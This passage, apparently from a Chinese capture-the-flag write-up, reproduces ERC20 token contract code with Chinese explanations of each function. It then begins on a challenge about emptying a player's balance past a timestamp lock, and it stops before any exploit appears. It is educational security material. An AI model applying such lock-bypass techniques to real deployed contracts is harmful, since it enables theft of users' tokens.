punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>account <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: mint to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> account<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        _totalSupply <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.</span>\n            _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> account<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> account<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>account <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: burn from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> accountBalance <span class=\"token operator\">=</span> _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>accountBalance <span class=\"token operator\">&gt;=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: burn amount exceeds balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">{</span>\n            _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> accountBalance <span class=\"token operator\">-</span> amount<span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.</span>\n            _totalSupply <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>owner <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: approve from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>spender <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: approve to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        _allowances<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_spendAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> currentAllowance <span class=\"token operator\">=</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>currentAllowance <span class=\"token operator\">!=</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>currentAllowance <span class=\"token operator\">&gt;=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: insufficient allowance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            unchecked <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> currentAllowance <span class=\"token operator\">-</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：</p>\n<ul>\n<li>使用solidity<code>0.4.17</code>（或更高版本）的语法</li>\n<li>调用者必须处理<code>false</code>来自<code>returns (bool success)</code>. 调用者不得假设<code>false</code>永远不会返回！</li>\n</ul></blockquote>\n<p>函数解析：</p>\n<ul>\n<li>构造函数，给令牌名称和符号</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name_<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    _name <span class=\"token operator\">=</span> name_<span class=\"token punctuation\">;</span>\n    _symbol <span class=\"token operator\">=</span> symbol_<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><p>返回令牌的名称 - 例如<code>\"MyToken\"</code>。</p>\n<p>可选 - 此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> _name<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><p>返回令牌的符号。例如“HIX”。</p>\n<p>可选 - 此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> _symbol<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><p>返回令牌使用的小数位数 - 例如<code>8</code>，表示将令牌数量除以<code>100000000</code>得到其用户表示。</p>\n<p>可选 - 此方法可用于提高可用性，但接口和其他契约不得期望这些值存在。</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">decimals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>返回代币总供应量。</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> _totalSupply<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>返回地址为<code>account</code>的另一个帐户的帐户余额。</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><p>将<code>_value</code>令牌数量转移到地址<code>_to</code>，并且必须触发<code>Transfer</code>事件。如果消息调用者的帐户余额没有足够的代币可花费，则该函数应该<code>throw</code>。</p>\n<p>注意 0 值的传输必须被视为正常传输并触发<code>Transfer</code>事件。</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><p>允许<code>_spender</code>多次从您的帐户中提款，最多不超过<code>_value</code>金额。如果再次调用此函数，它会用 覆盖当前的容差<code>_value</code>。</p>\n<p><strong>注意</strong>：为了防止像这里描述和讨论的攻击媒介，客户应该确保创建用户界面时，他们首先将允许额度设置为<code>0</code>，然后再为同一支出者将其设置为另一个值。虽然合约本身不应该强制执行它，以允许与之前部署的合约向后兼容</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><p>将<code>amount</code>令牌数量从 address <code>_from</code>转移到 address <code>_to</code>，并且必须触发<code>Transfer</code>事件。</p>\n<p>该<code>transferFrom</code>方法用于撤回工作流程，允许合约代表您转移代币。例如，这可以用于允许合同代表您转移代币和/或以子货币收取费用。该功能应该<code>throw</code>，除非<code>_from</code>帐户通过某种机制故意授权消息的发送者。</p>\n<p>注意 0 值的传输必须被视为正常传输并触发<code>Transfer</code>事件。</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">address</span> spender <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_spendAllowance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li><code>spender</code>返回仍允许从<code>owner</code>中提取的金额。</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> _allowances<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"随机数\"><a href=\"#随机数\" class=\"headerlink\" title=\"随机数\"></a>随机数</h3><p>题目源码里面有个<code>bolck.timestamp</code></p>\n<ul>\n<li><code>block.timestamp</code>表示当前区块何时被挖出来的</li>\n<li><code>now</code>表示当前时间戳信息</li>\n</ul>\n<p><img src=\"https://s2.loli.net/2023/03/24/Iea4TtuASPglxkf.png\" alt=\"image-20230208151045245.png\"></p>\n<ul>\n<li><code>block.coinbase</code>表示挖当前区块的矿工地址</li>\n<li><code>block.difficulty</code>表示这个区块的挖矿难度</li>\n<li><code>blovk.gaslimit</code>表示交易中所限制的最大的gas值</li>\n<li><code>block.number</code>表示当前区块的高度</li>\n</ul>\n<p>题目要求我们账户代币余额为0</p>\n<p>有个修饰器，要求</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">&gt;</span> 